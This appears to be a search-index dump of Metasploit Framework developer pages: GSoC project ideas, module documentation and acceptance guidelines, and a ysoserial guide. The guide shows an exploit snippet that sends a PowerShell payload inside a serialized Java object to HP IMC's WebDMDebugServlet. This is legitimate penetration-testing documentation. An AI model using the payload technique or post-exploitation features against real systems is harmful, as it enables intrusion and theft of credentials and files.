a unified interface between different Meterpreter, shell, powershell, mainframe, and other session types. However, there are areas where the implementation is not consistent, and could use improvements: Shell sessions do not implement the filesystem API that Meterpreter sessions have When a shell session is in a different language, e.g. Windows in French, the post API does not find the expected output. Add localization support for these. Simple commands like 'cmd_exec' are fast in Shell sessions but are relatively slow in Meterpreter sessions. Add an API to make Meterpreter run simple commands more easily. Difficulty: Varies Add meta-shell commands Shell sessions typically expose a direct connection to a remote shell, but are lacking a number of nice features such as the ability to stop a remote command, background a command (this could be advanced or depend on the underlying session), or to even lock the session. This project would implement some pre-processing hooks to shell sessions so that job control could be added by default (allowing backgrounding of commands), meta-commands like 'background' and 'sessions' could be added as well. Difficulty: \u2157 Improve the web vulnerability API This would follow up on the Arachni plugin PR https://github.com/rapid7/metasploit-framework/pull/8618 and improve the Metasploit data model to better represent modern web vulnerabilities. This project would require knowledge of data models, types of modern web vulnerabilities, and experience with web app security scanners. Difficulty: \u2158 Session-style module interaction Metasploit has the concept of 'sessions' where a connection context can define its own set of console operations. E.g. if you interact with a session, Metasploit switches to a specific subconsole for interaction. It would be nice as an alternative to 'action' for auxiliary modules, or as a way to merge related modules, to simply interact with the module. Difficulty: \u2157 Integration plugin with a 3 rd -party post-exploit framework Connect a 3 rd -party post-exploitation framework with Metasploit, such as Empire, Pupy, or Koadic, so that Metasploit can view and interact with sessions outside of its own types. Being able to use outside stagers in exploits, or adding the ability to 'upgrade' a session to an outside session type are other possibilities. Difficulty \u2157 Enhance Metasploitable3 Create a Simulated Active Directory Domain Expand functionality of the existing Windows 2008 VM to act as a domain controller. The setup should include a number of users of varying roles, multiple group policy objects and settings, and logon scripts or application deployments. Considerations should be taken on how and where to include purposeful vulnerabilities within these settings. Difficulty \u2156 Configure a Mock Corporate Network Currently metasploitable3 consists of two separate virtual machines with all currently configured vulnerable services available with a simple network connection. This should be expanded to include a larger number of VMs with services spread across them to better simulate a real world environment. Considerations must be taken for deploying this on systems with varying hardware availability, or look into different cloud providers. Difficulty \u2158 Add Monitoring Capabilities Between VMs Metasploitable3 is already a playground from an attacker's point of view, but how can we make it valuable from a defender's perspective. Research various network monitoring and detections solutions and implement them across the mock network. Set up a new \"NOC\" VM for keeping track of activity and watching for intrusion. This goal is to make it fairly simple for anyone to set up a red team vs blue team mock environment. Difficulty 5/5 Goliath Data Visualization Enhance existing Metasploit Goliath dashboard that allows observation of an active engagement. Data visualization would include, but not be limited to: host node graph with activity indicators and heat maps. Metasploit 'Goliath' Demo (msf-red) Difficulty \u2157 Elasticsearch Datastore Write Goliath data to Elasticsearch. Explore data visualization using Kibana. Difficulty \u2157 Submit your own If you want to suggest your own idea, please discuss it with us first on our mailing list to make sure it is a reasonable amount of work for a summer and that it fits the goals of the project.","title":"GSoC 2018 Project Ideas"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#enhance-metasploit-framework","text":"","title":"Enhance Metasploit Framework"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#improving-the-post-exploit-meterpreter-functionality","text":"Examples could include: * Sending keystrokes and mouse movement to a Meterpreter session * HTML based VNC style session control e.g https://github.com/rapid7/metasploit-framework/pull/9196 but accepting user input from the browser * Playing (streaming?) sounds to a Meterpreter session * Implementing the streaming record mechanism from more Meterpreter sessions * Text-to-speech and volume control * Fun behaviors - Ejecting the CD-ROM drive - Flipping the screen upside down - Changing screen colors - Turning the monitor on/off - Ordering donuts * MessageBox or live chat functionality (e.g \"This machine is vulnerable to MS17-010, you must run Windows Update!\") * Overlaying an image or even HTML on the user interface Difficulty: Varies","title":"Improving the Post-exploit / Meterpreter functionality"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#improving-post-exploit-api-to-be-more-consistent-work-smoothly-across-session-types","text":"The Metasploit post-exploitation API is intended to provide a unified interface between different Meterpreter, shell, powershell, mainframe, and other session types. However, there are areas where the implementation is not consistent, and could use improvements: Shell sessions do not implement the filesystem API that Meterpreter sessions have When a shell session is in a different language, e.g. Windows in French, the post API does not find the expected output. Add localization support for these. Simple commands like 'cmd_exec' are fast in Shell sessions but are relatively slow in Meterpreter sessions. Add an API to make Meterpreter run simple commands more easily. Difficulty: Varies","title":"Improving post-exploit API to be more consistent, work smoothly across session types"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#add-meta-shell-commands","text":"Shell sessions typically expose a direct connection to a remote shell, but are lacking a number of nice features such as the ability to stop a remote command, background a command (this could be advanced or depend on the underlying session), or to even lock the session. This project would implement some pre-processing hooks to shell sessions so that job control could be added by default (allowing backgrounding of commands), meta-commands like 'background' and 'sessions' could be added as well. Difficulty: \u2157","title":"Add meta-shell commands"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#improve-the-web-vulnerability-api","text":"This would follow up on the Arachni plugin PR https://github.com/rapid7/metasploit-framework/pull/8618 and improve the Metasploit data model to better represent modern web vulnerabilities. This project would require knowledge of data models, types of modern web vulnerabilities, and experience with web app security scanners. Difficulty: \u2158","title":"Improve the web vulnerability API"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#session-style-module-interaction","text":"Metasploit has the concept of 'sessions' where a connection context can define its own set of console operations. E.g. if you interact with a session, Metasploit switches to a specific subconsole for interaction. It would be nice as an alternative to 'action' for auxiliary modules, or as a way to merge related modules, to simply interact with the module. Difficulty: \u2157","title":"Session-style module interaction"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#integration-plugin-with-a-3rd-party-post-exploit-framework","text":"Connect a 3 rd -party post-exploitation framework with Metasploit, such as Empire, Pupy, or Koadic, so that Metasploit can view and interact with sessions outside of its own types. Being able to use outside stagers in exploits, or adding the ability to 'upgrade' a session to an outside session type are other possibilities. Difficulty \u2157","title":"Integration plugin with a 3rd-party post-exploit framework"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#enhance-metasploitable3","text":"","title":"Enhance Metasploitable3"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#create-a-simulated-active-directory-domain","text":"Expand functionality of the existing Windows 2008 VM to act as a domain controller. The setup should include a number of users of varying roles, multiple group policy objects and settings, and logon scripts or application deployments. Considerations should be taken on how and where to include purposeful vulnerabilities within these settings. Difficulty \u2156","title":"Create a Simulated Active Directory Domain"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#configure-a-mock-corporate-network","text":"Currently metasploitable3 consists of two separate virtual machines with all currently configured vulnerable services available with a simple network connection. This should be expanded to include a larger number of VMs with services spread across them to better simulate a real world environment. Considerations must be taken for deploying this on systems with varying hardware availability, or look into different cloud providers. Difficulty \u2158","title":"Configure a Mock Corporate Network"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#add-monitoring-capabilities-between-vms","text":"Metasploitable3 is already a playground from an attacker's point of view, but how can we make it valuable from a defender's perspective. Research various network monitoring and detections solutions and implement them across the mock network. Set up a new \"NOC\" VM for keeping track of activity and watching for intrusion. This goal is to make it fairly simple for anyone to set up a red team vs blue team mock environment. Difficulty 5/5","title":"Add Monitoring Capabilities Between VMs"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#goliath","text":"","title":"Goliath"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#data-visualization","text":"Enhance existing Metasploit Goliath dashboard that allows observation of an active engagement. Data visualization would include, but not be limited to: host node graph with activity indicators and heat maps. Metasploit 'Goliath' Demo (msf-red) Difficulty \u2157","title":"Data Visualization"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#elasticsearch-datastore","text":"Write Goliath data to Elasticsearch. Explore data visualization using Kibana. Difficulty \u2157","title":"Elasticsearch Datastore"},{"location":"dev/dark/GSoC-2018-Project-Ideas/#submit-your-own","text":"If you want to suggest your own idea, please discuss it with us first on our mailing list to make sure it is a reasonable amount of work for a summer and that it fits the goals of the project.","title":"Submit your own"},{"location":"dev/dark/GSoC-2019-Project-Ideas/","text":"TBD!","title":"GSoC 2019 Project Ideas"},{"location":"dev/dark/Generating-Module-Documentation/","text":"You can now generate documentation for modules on the fly using the info -d command. Module documentation allows you to see the help for a particular module from a web page, instead of from the command line. The help page includes: The PR history related to a particular module, if you have a GitHub access token set up. The basic usage instructions for a module. The advanced usage instructions for a module, if it's available. How to use it After you load a module, you can type info -d to generate a help page that provides basic usage information and displays the PR history for the module. msf> use auxiliary/scanner/smb/smb_login msf (smb_login)> info -d Additionally, if it's available, the help page will also include a KB that contains advanced usage information, such as vulnerable target details, caveats, and sample usage. The content in the KB is contained in a markdown file in the metasploit-framework/documentation/modules directory. Its purpose is to provide supplemental information that is outside of the scope of general documentation. Add an access token to see PR history In order for you to be able to view the PR history for a module, you'll need add your GitHub access token to the environment variable GITHUB_OAUTH_TOKEN=\"<your token here>\" in .bash_profile . To generate a GitHub access token, check out this page . The token will need to have a scope for repos. How you can write KBs Generally, the person who creates the module will write the initial KB for it, but anyone can write or contribute to it. Before you write a KB, you should take a look at the sample template, module_doc_template.md , or take a look at any of the KBs that are already available. To write a KB, you'll need to: Create an markdown (.md) file. Write the content. Save the file and name it after the module name. For example, the filename for ms08_067_netapi.rb is called ms08_067_netapi.md . Place it in the metasploit-framework/documentation/modules directory as directed below. Where to put the KB files If you go to metasploit-framework/documentation/modules , you'll see that there are documentation directories for each module type: auxiliary , exploit , payload , and post . To figure out where you need to put the file, you'll need to look at the module name. Start msfconsole. Type use <module name> . Type info . When the module name appears, look at the Module field. You'll see a file path for the module. That's the path where the KB needs to be added. For example: msf> use auxiliary/scanner/smb/smb_login msf (smb_login)> info Name: SMB Login Check Scanner Module: auxiliary/scanner/smb/smb_login .... If you were creating a KB for the smb login scanner, you'd add it to metasploit-framework/documentation/modules/auxiliary/scanner/smb . Sections you should include in the KB These are just suggestions, but it'd be nice if the KB had these sections: Vulnerable Applications - Tells users what targets (version numbers) are vulnerable to the module and provides instructions on how to access vulnerable targets for testing. If possible provide a download link and any setup instructions to configure the software appropriately. Verification Steps - Tells users how to use the module and what the expected results are from running the module. Options - Provides descriptions of all the options that can be run with the module. Additionally, clearly identify the options that are required. Scenarios - Provides sample usage and describes caveats that the user may need to be aware of when running the module. Include the version number and OS so that this setup can be replicated at a later date.","title":"Generating Module Documentation"},{"location":"dev/dark/Generating-Module-Documentation/#how-to-use-it","text":"After you load a module, you can type info -d to generate a help page that provides basic usage information and displays the PR history for the module. msf> use auxiliary/scanner/smb/smb_login msf (smb_login)> info -d Additionally, if it's available, the help page will also include a KB that contains advanced usage information, such as vulnerable target details, caveats, and sample usage. The content in the KB is contained in a markdown file in the metasploit-framework/documentation/modules directory. Its purpose is to provide supplemental information that is outside of the scope of general documentation.","title":"How to use it"},{"location":"dev/dark/Generating-Module-Documentation/#add-an-access-token-to-see-pr-history","text":"In order for you to be able to view the PR history for a module, you'll need add your GitHub access token to the environment variable GITHUB_OAUTH_TOKEN=\"<your token here>\" in .bash_profile . To generate a GitHub access token, check out this page . The token will need to have a scope for repos.","title":"Add an access token to see PR history"},{"location":"dev/dark/Generating-Module-Documentation/#how-you-can-write-kbs","text":"Generally, the person who creates the module will write the initial KB for it, but anyone can write or contribute to it. Before you write a KB, you should take a look at the sample template, module_doc_template.md , or take a look at any of the KBs that are already available. To write a KB, you'll need to: Create an markdown (.md) file. Write the content. Save the file and name it after the module name. For example, the filename for ms08_067_netapi.rb is called ms08_067_netapi.md . Place it in the metasploit-framework/documentation/modules directory as directed below.","title":"How you can write KBs"},{"location":"dev/dark/Generating-Module-Documentation/#where-to-put-the-kb-files","text":"If you go to metasploit-framework/documentation/modules , you'll see that there are documentation directories for each module type: auxiliary , exploit , payload , and post . To figure out where you need to put the file, you'll need to look at the module name. Start msfconsole. Type use <module name> . Type info . When the module name appears, look at the Module field. You'll see a file path for the module. That's the path where the KB needs to be added. For example: msf> use auxiliary/scanner/smb/smb_login msf (smb_login)> info Name: SMB Login Check Scanner Module: auxiliary/scanner/smb/smb_login .... If you were creating a KB for the smb login scanner, you'd add it to metasploit-framework/documentation/modules/auxiliary/scanner/smb .","title":"Where to put the KB files"},{"location":"dev/dark/Generating-Module-Documentation/#sections-you-should-include-in-the-kb","text":"These are just suggestions, but it'd be nice if the KB had these sections: Vulnerable Applications - Tells users what targets (version numbers) are vulnerable to the module and provides instructions on how to access vulnerable targets for testing. If possible provide a download link and any setup instructions to configure the software appropriately. Verification Steps - Tells users how to use the module and what the expected results are from running the module. Options - Provides descriptions of all the options that can be run with the module. Additionally, clearly identify the options that are required. Scenarios - Provides sample usage and describes caveats that the user may need to be aware of when running the module. Include the version number and OS so that this setup can be replicated at a later date.","title":"Sections you should include in the KB"},{"location":"dev/dark/Generating-`ysoserial`-Java-serialized-objects/","text":"Instead of embedding static Java serialized objects, Metasploit offers ysoserial-generated binaries with built-in randomization. The benefits of using the Metasploit library include quicker module development, easier-to-read code, and future-proof Java serialized objects. From the user's perspective, the use of the To use the ysoserial libraries, let's look at an example from the hp_imc_java_deserialization module: Example code In this example, the module calls cmd_psh_payload to generate a PowerShell payload, then uses the ysoserial library to generate a JSON1 -based serialized object, before sending it through an HTTP POST request: 1 def exploit 2 cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encode_final_payload: true}) 3 data = ::Msf::Util::JavaDeserialization.ysoserial_payload(\"JSON1\",cmd) 4 5 print_status \"Sending serialized Java object (#{data.length} bytes)...\" 6 res = send_request_cgi({ 7 'method' => 'POST', 8 'uri' => normalize_uri(target_uri.path, 'topo', 'WebDMDebugServlet'), 9 'data' => data 10 }) 11 end In line 3, the module uses the ysoserial_payload function, passing the name of the template and the command to be embedded within the template. The function returns a Java serialized object, which can then be passed to the vulnerable application. Calling ysoserial_payload The function takes two parameters, a template name and a command: The name parameter must be one of the support payloads stored in the ysoserial cache. As of this writing, the list includes: BeanShelll1 , Clogure , CommonBeanutils1 , CommonsCollections2 , CommonsCollections3 , CommonsCollections4 , CommonsCollections5 , CommonsCollections6 , Groovy1 , Hibernate1 , JBossInterceptors1 , JRMPClient , JSON1 , JavassistWeld1 , Jdk7u21 , MozillaRhino1 , Myfaces1 , ROME , Spring1 , Spring2 , and Vaadin1 . While ysoserial includes 8 other templates that are not listed above, these 8 payloads are unsupported by the library due to the need for complex inputs. Should there be use cases for those 8 templates, please consider opening an issue and submitting a pull request to add support. The command parameter will be executed by the remote system. The parameter is OS-agnostic, meaning that the module must determine the OS and architecture, if necessary, before generating a payload. Regenerating the ysoserial_payload JSON file (MAINTAINERS ONLY) Neither module developers nor users need to concern themselves with the following. Click to expand On occasion, Metasploit maintainers may want to re-run the script generation to incorporate new Java serialized objects from the ysoserial tool. To avoid invoking Java (and all its dependencies) at runtime, the serialized objects are generated and cached within a JSON file. The JSON file can be refreshed using a standalone Ruby script, which comes prepackaged with a Docker image that handles downloading `ysoserial` and necessary dependencies. The script, `Dockerimage` and a high-level `runme.sh` script is stored within `tools/payloads/ysoserial`. An example run looks like: $ cd ~/git/r7/metasploit-framework/tools/payloads/ysoserial $ ./runme.sh Sending build context to Docker daemon 101.8MB Step 1/8 : FROM ubuntu ---> cd6d8154f1e1 Step 2/8 : RUN apt update && apt -y upgrade ---> Using cache ---> ba7e5691ed5a Step 3/8 : RUN apt install -y wget openjdk-8-jre-headless ruby-dev make gcc ---> Using cache ---> d38488663627 Step 4/8 : RUN wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-original.jar ---> Using cache ---> 284ff722464b Step 5/8 : RUN wget -q https://github.com/pimps/ysoserial-modified/raw/master/target/ysoserial-modified.jar ---> Using cache ---> 334c1ccb6fab Step 6/8 : RUN gem install --silent diff-lcs json pry ---> Using cache ---> 9d452be9d01f Step 7/8 : COPY find_ysoserial_offsets.rb / ---> 61b6f339590c Step 8/8 : CMD ruby /find_ysoserial_offsets.rb ---> Running in ba7b14646e56 Removing intermediate container ba7b14646e56 ---> f4ca5ecb6848 Successfully built f4ca5ecb6848 Successfully tagged ysoserial-payloads:latest Generating payloads for BeanShell1... Generating payloads for C3P0... Error while generating or serializing payload java.lang.IllegalArgumentException: Command format is: <base_url>:<classname> at ysoserial.payloads.C3P0.getObject(C3P0.java:48) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'C3P0' and it will not be supported Generating payloads for Clojure... Generating payloads for CommonsBeanutils1... Generating payloads for CommonsCollections1... Generating payloads for CommonsCollections2... Generating payloads for CommonsCollections3... Generating payloads for CommonsCollections4... Generating payloads for CommonsCollections5... Generating payloads for CommonsCollections6... Generating payloads for FileUpload1... Error while generating or serializing payload java.lang.IllegalArgumentException: Unsupported command [] at ysoserial.payloads.FileUpload1.getObject(FileUpload1.java:71) at ysoserial.payloads.FileUpload1.getObject(FileUpload1.java:40) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'FileUpload1' and it will not be supported Generating payloads for Groovy1... Generating payloads for Hibernate1... Generating payloads for Hibernate2... Error while generating or serializing payload java.sql.SQLException: DataSource name cannot be empty string at javax.sql.rowset.BaseRowSet.setDataSourceName(BaseRowSet.java:855) at com.sun.rowset.JdbcRowSetImpl.setDataSourceName(JdbcRowSetImpl.java:4307) at ysoserial.payloads.Hibernate2.getObject(Hibernate2.java:58) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Hibernate2' and it will not be supported Generating payloads for JBossInterceptors1... Generating payloads for JRMPClient... Generating payloads for JRMPListener... Error while generating or serializing payload java.lang.NumberFormatException: For input string: \"\" at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) at java.lang.Integer.parseInt(Integer.java:592) at java.lang.Integer.parseInt(Integer.java:615) at ysoserial.payloads.JRMPListener.getObject(JRMPListener.java:42) at ysoserial.payloads.JRMPListener.getObject(JRMPListener.java:34) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'JRMPListener' and it will not be supported Generating payloads for JSON1... Generating payloads for JavassistWeld1... Generating payloads for Jdk7u21... Generating payloads for Jython1... Error while generating or serializing payload java.lang.IllegalArgumentException: Unsupported command [] at ysoserial.payloads.Jython1.getObject(Jython1.java:52) at ysoserial.payloads.Jython1.getObject(Jython1.java:42) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Jython1' and it will not be supported Generating payloads for MozillaRhino1... Generating payloads for Myfaces1... Generating payloads for Myfaces2... Error while generating or serializing payload java.lang.IllegalArgumentException: Command format is: <base_url>:<classname> at ysoserial.payloads.Myfaces2.getObject(Myfaces2.java:47) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Myfaces2' and it will not be supported Generating payloads for ROME... Generating payloads for Spring1... Generating payloads for Spring2... Generating payloads for URLDNS... Error while generating or serializing payload java.net.MalformedURLException: no protocol: at java.net.URL.<init>(URL.java:593) at ysoserial.payloads.URLDNS.getObject(URLDNS.java:56) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'URLDNS' and it will not be supported Generating payloads for Vaadin1... Generating payloads for Wicket1... Error while generating or serializing payload java.lang.IllegalArgumentException: Bad command format. at ysoserial.payloads.Wicket1.getObject(Wicket1.java:59) at ysoserial.payloads.Wicket1.getObject(Wicket1.java:49) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Wicket1' and it will not be supported DONE! Successfully generated 0 static payloads and 22 dynamic payloads. Skipped 8 unsupported payloads. At completion, the `data/ysoserial_payloads.json` file is overwritten and the 22 dynamic payloads are ready for use within the framework. Afterward, the developer should follow the standard `git` procedures to `add` and `commit` the new JSON file before generating a pull request and landing the updated JSON into the framework's `master` branch.","title":"Generating `ysoserial` Java serialized objects"},{"location":"dev/dark/Generating-`ysoserial`-Java-serialized-objects/#example-code","text":"In this example, the module calls cmd_psh_payload to generate a PowerShell payload, then uses the ysoserial library to generate a JSON1 -based serialized object, before sending it through an HTTP POST request: 1 def exploit 2 cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encode_final_payload: true}) 3 data = ::Msf::Util::JavaDeserialization.ysoserial_payload(\"JSON1\",cmd) 4 5 print_status \"Sending serialized Java object (#{data.length} bytes)...\" 6 res = send_request_cgi({ 7 'method' => 'POST', 8 'uri' => normalize_uri(target_uri.path, 'topo', 'WebDMDebugServlet'), 9 'data' => data 10 }) 11 end In line 3, the module uses the ysoserial_payload function, passing the name of the template and the command to be embedded within the template. The function returns a Java serialized object, which can then be passed to the vulnerable application.","title":"Example code"},{"location":"dev/dark/Generating-`ysoserial`-Java-serialized-objects/#calling-ysoserial_payload","text":"The function takes two parameters, a template name and a command: The name parameter must be one of the support payloads stored in the ysoserial cache. As of this writing, the list includes: BeanShelll1 , Clogure , CommonBeanutils1 , CommonsCollections2 , CommonsCollections3 , CommonsCollections4 , CommonsCollections5 , CommonsCollections6 , Groovy1 , Hibernate1 , JBossInterceptors1 , JRMPClient , JSON1 , JavassistWeld1 , Jdk7u21 , MozillaRhino1 , Myfaces1 , ROME , Spring1 , Spring2 , and Vaadin1 . While ysoserial includes 8 other templates that are not listed above, these 8 payloads are unsupported by the library due to the need for complex inputs. Should there be use cases for those 8 templates, please consider opening an issue and submitting a pull request to add support. The command parameter will be executed by the remote system. The parameter is OS-agnostic, meaning that the module must determine the OS and architecture, if necessary, before generating a payload.","title":"Calling ysoserial_payload"},{"location":"dev/dark/Generating-`ysoserial`-Java-serialized-objects/#regenerating-the-ysoserial_payload-json-file-maintainers-only","text":"Neither module developers nor users need to concern themselves with the following. Click to expand On occasion, Metasploit maintainers may want to re-run the script generation to incorporate new Java serialized objects from the ysoserial tool. To avoid invoking Java (and all its dependencies) at runtime, the serialized objects are generated and cached within a JSON file. The JSON file can be refreshed using a standalone Ruby script, which comes prepackaged with a Docker image that handles downloading `ysoserial` and necessary dependencies. The script, `Dockerimage` and a high-level `runme.sh` script is stored within `tools/payloads/ysoserial`. An example run looks like: $ cd ~/git/r7/metasploit-framework/tools/payloads/ysoserial $ ./runme.sh Sending build context to Docker daemon 101.8MB Step 1/8 : FROM ubuntu ---> cd6d8154f1e1 Step 2/8 : RUN apt update && apt -y upgrade ---> Using cache ---> ba7e5691ed5a Step 3/8 : RUN apt install -y wget openjdk-8-jre-headless ruby-dev make gcc ---> Using cache ---> d38488663627 Step 4/8 : RUN wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-original.jar ---> Using cache ---> 284ff722464b Step 5/8 : RUN wget -q https://github.com/pimps/ysoserial-modified/raw/master/target/ysoserial-modified.jar ---> Using cache ---> 334c1ccb6fab Step 6/8 : RUN gem install --silent diff-lcs json pry ---> Using cache ---> 9d452be9d01f Step 7/8 : COPY find_ysoserial_offsets.rb / ---> 61b6f339590c Step 8/8 : CMD ruby /find_ysoserial_offsets.rb ---> Running in ba7b14646e56 Removing intermediate container ba7b14646e56 ---> f4ca5ecb6848 Successfully built f4ca5ecb6848 Successfully tagged ysoserial-payloads:latest Generating payloads for BeanShell1... Generating payloads for C3P0... Error while generating or serializing payload java.lang.IllegalArgumentException: Command format is: <base_url>:<classname> at ysoserial.payloads.C3P0.getObject(C3P0.java:48) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'C3P0' and it will not be supported Generating payloads for Clojure... Generating payloads for CommonsBeanutils1... Generating payloads for CommonsCollections1... Generating payloads for CommonsCollections2... Generating payloads for CommonsCollections3... Generating payloads for CommonsCollections4... Generating payloads for CommonsCollections5... Generating payloads for CommonsCollections6... Generating payloads for FileUpload1... Error while generating or serializing payload java.lang.IllegalArgumentException: Unsupported command [] at ysoserial.payloads.FileUpload1.getObject(FileUpload1.java:71) at ysoserial.payloads.FileUpload1.getObject(FileUpload1.java:40) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'FileUpload1' and it will not be supported Generating payloads for Groovy1... Generating payloads for Hibernate1... Generating payloads for Hibernate2... Error while generating or serializing payload java.sql.SQLException: DataSource name cannot be empty string at javax.sql.rowset.BaseRowSet.setDataSourceName(BaseRowSet.java:855) at com.sun.rowset.JdbcRowSetImpl.setDataSourceName(JdbcRowSetImpl.java:4307) at ysoserial.payloads.Hibernate2.getObject(Hibernate2.java:58) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Hibernate2' and it will not be supported Generating payloads for JBossInterceptors1... Generating payloads for JRMPClient... Generating payloads for JRMPListener... Error while generating or serializing payload java.lang.NumberFormatException: For input string: \"\" at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) at java.lang.Integer.parseInt(Integer.java:592) at java.lang.Integer.parseInt(Integer.java:615) at ysoserial.payloads.JRMPListener.getObject(JRMPListener.java:42) at ysoserial.payloads.JRMPListener.getObject(JRMPListener.java:34) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'JRMPListener' and it will not be supported Generating payloads for JSON1... Generating payloads for JavassistWeld1... Generating payloads for Jdk7u21... Generating payloads for Jython1... Error while generating or serializing payload java.lang.IllegalArgumentException: Unsupported command [] at ysoserial.payloads.Jython1.getObject(Jython1.java:52) at ysoserial.payloads.Jython1.getObject(Jython1.java:42) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Jython1' and it will not be supported Generating payloads for MozillaRhino1... Generating payloads for Myfaces1... Generating payloads for Myfaces2... Error while generating or serializing payload java.lang.IllegalArgumentException: Command format is: <base_url>:<classname> at ysoserial.payloads.Myfaces2.getObject(Myfaces2.java:47) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Myfaces2' and it will not be supported Generating payloads for ROME... Generating payloads for Spring1... Generating payloads for Spring2... Generating payloads for URLDNS... Error while generating or serializing payload java.net.MalformedURLException: no protocol: at java.net.URL.<init>(URL.java:593) at ysoserial.payloads.URLDNS.getObject(URLDNS.java:56) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'URLDNS' and it will not be supported Generating payloads for Vaadin1... Generating payloads for Wicket1... Error while generating or serializing payload java.lang.IllegalArgumentException: Bad command format. at ysoserial.payloads.Wicket1.getObject(Wicket1.java:59) at ysoserial.payloads.Wicket1.getObject(Wicket1.java:49) at ysoserial.GeneratePayload.main(GeneratePayload.java:34) ERROR: Errored while generating 'Wicket1' and it will not be supported DONE! Successfully generated 0 static payloads and 22 dynamic payloads. Skipped 8 unsupported payloads. At completion, the `data/ysoserial_payloads.json` file is overwritten and the 22 dynamic payloads are ready for use within the framework. Afterward, the developer should follow the standard `git` procedures to `add` and `commit` the new JSON file before generating a pull request and landing the updated JSON into the framework's `master` branch.","title":"Regenerating the ysoserial_payload JSON file (MAINTAINERS ONLY)"},{"location":"dev/dark/Guidelines-for-Accepting-Modules-and-Enhancements/","text":"Acceptance Guidelines Contributions from the open source community are the soul of Metasploit, and we love evaluating and landing pull requests that add new Framework features and content. Metasploit Framework has many tens of thousands of users who rely on daily, consistent, and error-free updates. Because of this, Metasploit's core developers have adopted a fairly high standard for pull requests that add new Framework functionality and Metasploit modules. In order to encourage open and transparent development, this document outlines some general guidelines for Metasploit contributors and developers. Adhering to these guidelines maximizes the chances that your work will be merged into the official Metasploit distribution packages. Module Additions Most open source community support for Metasploit comes in the form of Metasploit modules. The following should be considered for acceptance; note that these are guidelines and not categorical imperatives (\"should\"s, not \"must\"s), since there are always exceptions to the norm\u2014especially when it comes to novel new attacks and techniques. Modules should pass msftidy.rb and adhere to the CONTRIBUTING.md guidelines. Both are distributed with Metasploit. See [[Style Tips]] for some information on how to take some of the headache out of whitespace issues. Modules should have a clear and obvious goal: Exploits should result in a shell. Post modules should result in privilege escalation or loot. Auxiliary modules are an \"Everything else\" category, but even they should be limited to a well-defined task\u2014(e.g., information gathering to enable an exploit or a post module). Modules should not launch other modules, given the complexity of setting multiple payloads. Such actions are usually automation tasks for an external UI. Denial of Service modules should be asymmetric and at least have some interesting feature. If it's comparable to a synflood, it shouldn't be included. If it's comparable to Baliwicked, it should be included. Modules that hover the line, such as slowloris, may be included with some justification. Modules should be able to function as expected with minimal configuration. Defaults should be sensible and usually correct. Modules should not depend on exact timing, uncontrollable heap states, system DLLs, etc. All memory addresses (ie. a JMP ESP, or a ROP gadget) should be part of the metadata under 'Targets', and documented (what instructions it points to, and what DLL). If the exploit is against a specific hardware (e.g., routers, PLCs, etc), or against a software that's not free (and no trial/demo available), please remember to submit a binary packet capture (pcap-formatted) along with the module that demonstrates the exploit actually works. Please don't use the alphanum encoder as a way to avoid BadChar analysis. Modules which set the EncoderType field in the payload as a way to avoid doing real BadChar analysis will be rejected. These modules are nearly always unreliable in the real world. Exploit ranking definitions can be found on the [[Exploit Ranking]] page. Exploit modules should implement a check() function when this is trivial to do so. Versions exposed through banners or network protocols should always result in a check() routine when a patch is available that changes this version. If a module (auxiliary or post) obtains some sort of information from the victim machine, it should store that data using one (or more) of the following methods: store_loot() : Used to store both stolen files (both text and binary) and \"screencaps\" of commands such as a ps -ef and ifconfig . The file itself need not be of forensic-level integrity -- they may be parsed by a post module to extract only the relevant information for a penetration tester. report_auth_info() : Used to store working credentials that are immediately reusable by another module. For example, a module dumping the local SMB hashes would use this, as would a module which reads username:password combinations for a specific host and service. Specifically, merely \"likely\" usernames and passwords should use store_loot() instead. report_vuln() : Auxiliary and post modules that exercise a particular vulnerability should report_vuln() upon success. Note that exploit modules automatically report_vuln() as part of opening a session (there is no need to call it especially). report_note() : Modules should make an effort to avoid report_note() when one of the above methods would be a better fit, but there are often cases where \"loot\" or \"cred\" or \"vuln\" classifications are not immediately appropriate. report_note() calls should always set a OID-style dotted :type , such as domain.hosts , so other modules may easily find them in the database. Modules should take advantage of the normal Metasploit APIs. For example, they should not attempt to create their own TCP sockets or application protocols with native Ruby; they should 